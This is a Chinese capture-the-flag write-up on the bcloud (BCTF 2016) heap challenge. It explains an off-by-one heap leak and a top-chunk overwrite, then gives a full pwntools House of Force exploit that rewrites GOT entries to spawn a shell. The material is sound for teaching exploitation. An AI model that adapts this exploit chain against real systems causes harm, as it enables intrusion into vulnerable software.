# bcloud_bctf_2016#

https://www.cnblogs.com/LynneHuan/p/14616450.html

## 总结#
根据本题，学习与收获有：

- house of force不需要保证top chunk的size域是合法的，但是house of orange需要保证size域合法，因为后一种利用方式会把top chunk放在unsorted bin，会有chunk size的检查。
- house of force一般需要泄露出heap地址，并且需要能改写top chunk的size域，还要能分配任意大小的内存，总的来说，条件还是很多的。可以直接分配到got表附近，但是这样会破坏一些got表的内容，也可分配到堆指针数组，一般在bss或者data段。
- strcpy会一直拷贝源字符串，直到遇到\x0a或者\x00字符。并且在拷贝结束后，尾部添加一个\x00字符，很多off by one的题目就是基于此。
## 题目分析#
题目的运行环境是ubuntu 16，使用libc-2.23.so。

### checksec#

注意：arch为i386-32-little。

### 函数分析#
很明显，这又是一个菜单题。首先来看main函数：

main

```c
void __noreturn main()
{
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  welcome();
  while ( 1 )
  {
    switch ( menu() )
    {
      case 1:
        new_note();
        break;
      case 2:
        show_note();
        break;
      case 3:
        edit_note();
        break;
      case 4:
        del_note();
        break;
      case 5:
        sync_note();
        break;
      case 6:
        exit_program();
      default:
        invalid_option();
        break;
    }
  }
}
```

在进入while循环之前，首先调用了welcome函数引用与参考[1]，然后再去执行循环体。继续来看一下welcome中有什么操作。

welcome

```c
int welcome()
{
  get_name();
  return get_org_host();
}
```

这里面调了两个函数，继续分析

get_name

```c
unsigned int get_name()
{
  char s[64]; // [esp+1Ch] [ebp-5Ch] BYREF
  char *ptr; // [esp+5Ch] [ebp-1Ch]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(s, 0, 0x50u);
  puts("Input your name:");
  read_off_by_one(s, 64, 10);
  ptr = (char *)malloc(0x40u);
  dword_804B0CC = (int)ptr;
  strcpy(ptr, s);
  put_info(ptr);
  return __readgsdword(0x14u) ^ v3;
}
```

这里面操作为：

- 向栈变量s写入0x40大小的数据，有一个字节的溢出
- 申请内存，malloc(0x40)，得到的chunk大小为0x48
- 调用strcpy，把s的数据拷贝到刚刚申请的chunk的用户内存区域。

这里存在一个漏洞点，越界拷贝了堆地址，在后面的漏洞点中会有分析。

顺便放一下read_off_by_one函数和put_info函数：

read_off_by_one:

```c
int __cdecl read_off_by_one(int a1, int a2, char a3)
{
  char buf; // [esp+1Bh] [ebp-Dh] BYREF
  int i; // [esp+1Ch] [ebp-Ch]

  for ( i = 0; i < a2; ++i )
  {
    if ( read(0, &buf, 1u) <= 0 )
      exit(-1);
    if ( buf == a3 )
      break;
    *(_BYTE *)(a1 + i) = buf;
  }
  *(_BYTE *)(i + a1) = 0;                       // off-by-one
  return i;
}
```

put_info:

```c
int __cdecl put_info(const char *addr)
{
  printf("Hey %s! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!\n", addr);
  return puts("Now let's set synchronization options.");
}
```

get_org_host

```c
unsigned int get_org_host()
{
  char s[64]; // [esp+1Ch] [ebp-9Ch] BYREF
  char *ptr2; // [esp+5Ch] [ebp-5Ch]
  char p[68]; // [esp+60h] [ebp-58h] BYREF
  char *ptr1; // [esp+A4h] [ebp-14h]
  unsigned int v5; // [esp+ACh] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  memset(s, 0, 0x90u);
  puts("Org:");
  read_off_by_one((int)s, 64, 10);
  puts("Host:");
  read_off_by_one((int)p, 64, 10);
  ptr1 = (char *)malloc(0x40u);
  ptr2 = (char *)malloc(0x40u);
  dword_804B0C8 = (int)ptr2;
  dword_804B148 = (int)ptr1;
  strcpy(ptr1, p);
  strcpy(ptr2, s);
  puts("OKay! Enjoy:)");
  return __readgsdword(0x14u) ^ v5;
}
```

这里涉及到两次向栈变量上写数据，并且两次申请堆内存，两次调用strcpy接口。这里存在着溢出漏洞，后续漏洞点中会进一步分析。

menu
```c
int menu()
{
  puts("1.New note\n2.Show note\n3.Edit note\n4.Delete note\n5.Syn\n6.Quit\noption--->>");
  return get_int_num();
}
```

new_note
```c
int new_note()
{
  int result; // eax
  int i; // [esp+18h] [ebp-10h]
  int int_num; // [esp+1Ch] [ebp-Ch]

  for ( i = 0; i <= 9 && ptr_array[i]; ++i )
    ;
  if ( i == 10 )
    return puts("Lack of space. Upgrade your account with just $100 :)");
  puts("Input the length of the note content:");
  int_num = get_int_num();
  ptr_array[i] = (int)malloc(int_num + 4);
  if ( !ptr_array[i] )
    exit(-1);
  ptr_size[i] = int_num;
  puts("Input the content:");
  read_off_by_one(ptr_array[i], int_num, 10);
  printf("Create success, the id is %d\n", i);
  result = i;
  dword_804B0E0[i] = 0;
  return result;
}
```


此住需要注意的点有：

- ptr_array里面最多填满10个地址
- 实际申请的chunk的大小是size + 4，能写的大小却是size，基本上不能使用off by one
show_note


edit_note

```c
int edit_note()
{
  unsigned int idx; // [esp+14h] [ebp-14h]
  int ptr; // [esp+18h] [ebp-10h]
  int size; // [esp+1Ch] [ebp-Ch]

  puts("Input the id:");
  idx = get_int_num();
  if ( idx >= 0xA )
    return puts("Invalid ID.");
  ptr = ptr_array[idx];
  if ( !ptr )
    return puts("Note has been deleted.");
  size = ptr_size[idx];
  dword_804B0E0[idx] = 0;
  puts("Input the new content:");
  read_off_by_one(ptr, size, 10);
  return puts("Edit success.");
}
```

从ptr_array数组和ptr_size数组中取出存储的地址和大小，并重新获取用户输入并写入数据。

del_note

```c
int del_note()
{
  unsigned int idx; // [esp+18h] [ebp-10h]
  void *ptr; // [esp+1Ch] [ebp-Ch]

  puts("Input the id:");
  idx = get_int_num();
  if ( idx >= 0xA )
    return puts("Invalid ID.");
  ptr = (void *)ptr_array[idx];
  if ( !ptr )
    return puts("Note has been deleted.");
  ptr_array[idx] = 0;
  ptr_size[idx] = 0;
  free(ptr);
  return puts("Delete success.");
}
```

释放指针指向的内存后直接将指针置为0

### 漏洞点#
一开始看这个程序的时候，一直把目光对准了while循环体里面，几个关于note的函数，因为一般情况下，漏洞点会出现在这些函数里面，事实证明，惯性思维害死人。找了半天，啥洞也没找到，最后把目光聚焦在welcome里面的两个函数，才发现了利用点。接下来，详细讲一讲漏洞点。

漏洞点1：get_name泄露堆地址
get_name:

```
unsigned int get_name()
{
  char s[64]; // [esp+1Ch] [ebp-5Ch] BYREF
  char *ptr; // [esp+5Ch] [ebp-1Ch]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(s, 0, 0x50u);
  puts("Input your name:");
  read_off_by_one(s, 64, 10);
  ptr = (char *)malloc(0x40u);
  dword_804B0CC = (int)ptr;
  strcpy(ptr, s);
  put_info(ptr);
  return __readgsdword(0x14u) ^ v3;
}
```


这里画一下栈内存与堆内存的变化：

填充内容前：

**img1（get_name：填充前的栈/堆布局示意，文字版）**

- **stack（栈，从高地址到低地址增长；图中上方是低地址、下方是高地址）**
  - **`s[64]`（局部数组，`[esp+1Ch] ~ [ebp-5Ch]`）**：此时内容全为 `0`（`memset(s,0,0x50)`），用于接收 `read_off_by_one(s, 64, 10)` 的输入。
  - **`ptr`（局部指针，`[esp+5Ch] ~ [ebp-1Ch]`）**：紧挨着 `s` 的“末尾”位置保存指针变量本身，但在读入 `s` 之前/刚开始时，`ptr` 还未被赋成 `malloc` 的返回值。
  - **`ebp`**：栈帧基址在 `s` 的下方（高地址侧），用于函数栈帧管理。
  - **关键偏移**：`s` 的起始到 `ptr` 的位置差约为 `0x5c`，`ptr` 到 `ebp` 的距离约为 `0x1c`（与反编译注释/图中标注对应）。

- **heap（堆）**
  - 即将执行 `malloc(0x40)`：在 glibc-2.23 的 i386 环境下，用户请求 `0x40` 字节，会拿到一个 **实际 chunk 大小为 `0x48`** 的块：
    - **chunk header**：`prev_size`（仅当前一块 free 时有意义）与 `size`（包含标志位）。
    - **user data**：`0x40` 字节可用区域，随后 `strcpy(ptr, s)` 会从这里开始写入。
  - chunk 后面紧跟着 **top chunk**（当前堆顶的剩余空间），其 header 中也有 `top_chunk->prev_size / top_chunk->size` 字段（图中黄色部分）。

填充内容后：

**img2（get_name：填充后/触发泄露的变化，文字版）**

- **对 `s` 的写入行为**：`read_off_by_one(s, 64, 10)` 最多写 `64` 字节，然后**无条件再写一个结尾 `\\x00`**：`*(_BYTE *)(i + a1) = 0`。
  - 当我们输入 **恰好 0x40 个“可见字符”且不包含 `\\x00/\\x0a`** 时，`s[0..0x3f]` 被填满（例如 `0x61` 即 `'a'`），随后 off-by-one 写入的终止符会落在 **`s` 之后的下一个字节**（图中用箭头强调）。

- **`strcpy(ptr, s)` 导致的打印泄露**：
  - 随后 `ptr = malloc(0x40)` 分配得到 **chunk A（size=0x48）**，`strcpy(ptr, s)` 会从 `s` 的起始地址开始拷贝，直到遇到 `\\x00` 才停止，并在目标末尾补 `\\x00`。
  - 由于 off-by-one 的 `\\x00` 位置可能**不在 `s[0x3f]` 内**（而是在 `s` 外侧更靠后的字节），`strcpy` 可能会把 `s` 后面紧邻的栈内容也当作字符串继续拷贝到堆上。
  - `put_info(ptr)` 内部 `printf("Hey %s! ...", addr)` 会把 `ptr` 指向的字符串一直打印到遇到 `\\x00` 为止；此时字符串尾部可能夹带了**原本位于栈上的指针/地址字节序列**，因此会“带出”一个看起来像地址的 4 字节内容（即你后面用于计算 `top_chunk_addr` 的那个堆相关泄露值）。

因此，当填慢0x40个可见字符后，调用put_info打印内容的时候会把上面的chunk的地址给打印出来。

漏洞点2：get_org_host修改top chunk的size域
get_org_host函数：



填充前：

**img3（get_org_host：填充前的栈/堆布局示意，文字版）**

- **stack（栈）**
  - **`s[64]`（`[esp+1Ch] ~ [ebp-9Ch]`）**：用于接收 `Org:` 的输入。
  - **`p[68]`（`[esp+60h] ~ [ebp-58h]`）**：用于接收 `Host:` 的输入（注意它在栈上与 `s` 相邻/部分重叠区间由编译布局决定，图中按连续区域展示）。
  - **`ptr2`（`[esp+5Ch] ~ [ebp-5Ch]`）**、**`ptr1`（`[esp+A4h] ~ [ebp-14h]`）**：两个即将保存 `malloc(0x40)` 返回值的栈指针变量（图中分别画成绿色/蓝色指针槽位）。
  - **关键偏移标注**：图中给出 `0x9c / 0x5c / 0x58 / 0x14` 等距离，用来表示 `s、p、ptr1、ptr2、ebp` 之间的大致相对位置（对应反编译注释的栈偏移）。

- **heap（堆）**
  - 即将连续两次 `malloc(0x40)`：会得到 **chunk1** 和 **chunk2**，两者的 **chunk size 都是 `0x48`**（图中紫色/黄色块，各自包含 header + user data）。
  - chunk2 之后紧跟 **top chunk**（堆顶剩余空间），其 header 里也有 `prev_size/size`（图中橙色的 top_chunk header）。

往栈变量s和p写了数据，并分配内存后：

**img4（get_org_host：写入 s/p + 分配 chunk1/chunk2 后，文字版）**

- **栈上数据状态**：
  - 我们先向 **`s`** 写入一串可控字节（例如 `0x61` 重复，即 `'a'`），向 **`p`** 写入另一串可控字节（例如 `0x62` 重复，即 `'b'`）。
  - `read_off_by_one` 的特性仍然存在：两次读入都会在各自缓冲区末尾再写一个 `\\x00`，因此存在“边界+1 字节”的影响空间。

- **堆上分配结果**：
  - `ptr1 = malloc(0x40)` → **chunk1（size=0x48）**，`ptr1` 指向 chunk1 的 user data 起始处。
  - `ptr2 = malloc(0x40)` → **chunk2（size=0x48）**，`ptr2` 指向 chunk2 的 user data 起始处。
  - 此刻 chunk1、chunk2 的 user data 还未被 `strcpy` 写入（图中分别留空/用占位表示），chunk2 后面依旧是 top chunk。

执行两次strcpy后：

**img5（get_org_host：两次 strcpy 后覆盖 top chunk size 的过程，文字版）**

- **`strcpy(ptr1, p)` 写入 chunk1**：
  - `strcpy` 会把 `p` 当作 C 字符串拷贝到 chunk1 的 user data，直到遇到 `\\x00`。
  - 如果我们构造 `p` 让其在结尾处“恰好越过” chunk1 的 user data 边界（典型是利用 `read_off_by_one` 在 `p` 相邻位置产生的 `\\x00` 位置偏移），则 `strcpy` 的连续写入可能会溢出到 **chunk2 的 header / user data** 区域（图中 chunk1 写入 `0x62...` 并向下覆盖的红色区域）。

- **`strcpy(ptr2, s)` 写入 chunk2，并进一步影响 top chunk header**：
  - 同理，`strcpy(ptr2, s)` 会把 `s` 写入 chunk2 的 user data；若字符串终止符位置被 off-by-one 影响，导致 `strcpy` 认为字符串更长，就可能从 chunk2 的 user data 继续写，覆盖到 chunk2 后面的 **top chunk header**。
  - 图中最终效果是：**top chunk 的 `size` 字段被污染/改写**（黄色的 `top_chunk size` 被改成可控值，例如利用 `p32(0xffffffff)` 的那种写法），这正是后续 **House of Force** 的关键前置条件（让 top chunk size 变得“无限大”，从而实现任意距离的 `malloc` 前移）。

可以看到top chunk的size域被更改了。

## 利用思路#
### 知识点#
- 本题主要使用House of Force Attack，注意，这个攻击方法在2.23、2.27版本的libc是奏效的，在libc-2.29.so加了top chunk的size域合法性的校验。
- 计算大小的时候，可以就直接给malloc传一个负数，会自动转化为正整数的。
- 可以在调试过程中确定要分配的那个大小，计算得到的size可能会有一些偏移。
### 利用过程#
利用步骤：

- 在get_name接口中，输入0x40 * 'a'，泄露出堆地址
- 通过get_org_host覆盖top chunk的size，修改为0xffffffff。
- 利用house of force分配到ptr_array，即地址为0x0x804b120。
- 连续分配4个用户大小为0x44大小的chunk A、B、C、D。那么，编辑chunk A的时候，就能直接修改ptr_array数组元素的地址。引用与参考[2]。
- 调用edit_note，编辑chunk A，将ptr_array[2]设置为free@got，将ptr_array[3]设置为printf@got。
- 调用edit_note，编辑ptr_array[2]的内容为puts@plt，就是将free@got修改为了puts@plt地址。
- 调用del_note，去释放ptr_array[3]，实际上调用的是puts打印出来了printf的地址。
- 再次调用edit_note，编辑chunk A，将ptr_array[0]设置为0x804b130，ptr_array[2]设置为free@got，将ptr_array[4]写为/bin/sh
- 调用edit_note，将free@got修改为了system地址
- 调用del_note，释放ptr_array[0]，即可getshell
## EXP#
### 调试过程#
定义好函数：
```python
def new_note(size, content, io:tube=sh):
    io.sendlineafter('option--->>\n', '1')
    io.sendlineafter("Input the length of the note content:\n", str(size))
    io.sendlineafter("Input the content:\n", content)
    io.recvline()

def edit_note(idx, content, io:tube=sh):
    io.sendlineafter('option--->>\n', '3')
    io.sendlineafter("Input the id:\n", str(idx))
    io.sendlineafter("Input the new content:\n", content)
    io.recvline()


def del_note(idx, io:tube=sh):
    io.sendlineafter('option--->>\n', '4')
    io.sendlineafter("Input the id:\n", str(idx))
```
执行get_name，泄露heap地址：
```python
sh.sendafter("Input your name:\n", 'a' * 0x40)
sh.recvuntil('a' * 0x40)
leak_heap_addr = u32(sh.recvn(4))
LOG_ADDR('leak_heap_addr', leak_heap_addr)
```

执行get_org_host，修改top chunk的size为0xffffffff：
```python
sh.sendafter("Org:\n", 'a' * 0x40)
sh.sendafter("Host:\n", p32(0xffffffff) + (0x40 - 4) * b'a')
sh.recvuntil("OKay! Enjoy:)\n")
```

计算出top chunk的地址，分配到0x804b120：
```python
top_chunk_addr = leak_heap_addr + 0xd0
ptr_array = 0x804b120
margin = ptr_array - top_chunk_addr
new_note(margin - 20, "") # 0
```

连续分配四块chunk，修改free@got的内容为puts@plt，泄露出libc的地址：
```python
free_got = 0x804b014
puts_plt = 0x8048520
printf_got = 0x804b010
for _ in range(4):
    new_note(0x40, 'aa')
edit_note(1, p32(0x804b120) * 2 + p32(free_got) + p32(printf_got))
edit_note(2, p32(puts_plt))
del_note(3)
msg = sh.recvuntil("Delete success.\n")
printf_addr = u32(msg[:4])
LOG_ADDR('printf_addr', printf_addr)
```

计算出system地址，修改free@got为system函数的地址，并准备好/bin/sh：
```python
system_addr = printf_addr - offset
edit_note(1, p32(0x804b130) * 2 + p32(free_got) * 2 + b'/bin/sh')
edit_note(2, p32(system_addr))
```

释放带有/bin/sh的chunk，即可getshell：
```python
del_note(0)
```

### 完整exp#
```python
from pwn import *
context.update(arch='i386', os='linux')

sh = process('./bcloud_bctf_2016')

LOG_ADDR = lambda s, i:log.info('{} ===> {}'.format(s, i))

def new_note(size, content, io:tube=sh):
    io.sendlineafter('option--->>\n', '1')
    io.sendlineafter("Input the length of the note content:\n", str(size))
    io.sendlineafter("Input the content:\n", content)
    io.recvline()

def edit_note(idx, content, io:tube=sh):
    io.sendlineafter('option--->>\n', '3')
    io.sendlineafter("Input the id:\n", str(idx))
    io.sendlineafter("Input the new content:\n", content)
    io.recvline()


def del_note(idx, io:tube=sh):
    io.sendlineafter('option--->>\n', '4')
    io.sendlineafter("Input the id:\n", str(idx))

sh.sendafter("Input your name:\n", 'a' * 0x40)
sh.recvuntil('a' * 0x40)

leak_heap_addr = u32(sh.recvn(4))
LOG_ADDR('leak_heap_addr', leak_heap_addr)

sh.sendafter("Org:\n", 'a' * 0x40)

sh.sendafter("Host:\n", p32(0xffffffff) + (0x40 - 4) * b'a')
sh.recvuntil("OKay! Enjoy:)\n")

top_chunk_addr = leak_heap_addr + 0xd0

ptr_array = 0x804b120
margin = ptr_array - top_chunk_addr

new_note(margin - 20, "") # 0

free_got = 0x804b014
puts_plt = 0x8048520
printf_got = 0x804b010

for _ in range(4):
    new_note(0x40, 'aa')

edit_note(1, p32(0x804b120) * 2 + p32(free_got) + p32(printf_got))

edit_note(2, p32(puts_plt))

del_note(3)

msg = sh.recvuntil("Delete success.\n")

printf_addr = u32(msg[:4])
LOG_ADDR('printf_addr', printf_addr)

if all_parsed_args['debug_enable']:
    offset =  0xe8d0 # 0x10470
else:
    libc = LibcSearcher('printf', printf_addr)
    libc_base = printf_addr - libc.dump('printf')
    LOG_ADDR('libc_base', libc_base)
    offset = libc.dump('printf') - libc.dump('system')
    LOG_ADDR('offset', offset)

system_addr = printf_addr - offset

edit_note(1, p32(0x804b130) * 2 + p32(free_got) * 2 + b'/bin/sh')

edit_note(2, p32(system_addr))

del_note(0)

sh.interactive()
```
## 引用与参考#
以下为引用与参考，可能以脚注的形式呈现！

[1]：本文的函数均已重命名，原二进制文件不带符号信息

[2]：其实这里可以直接去控制ptr_size数组，一直到ptr_array，这样还可以控制size，分配一个chunk就够操作了。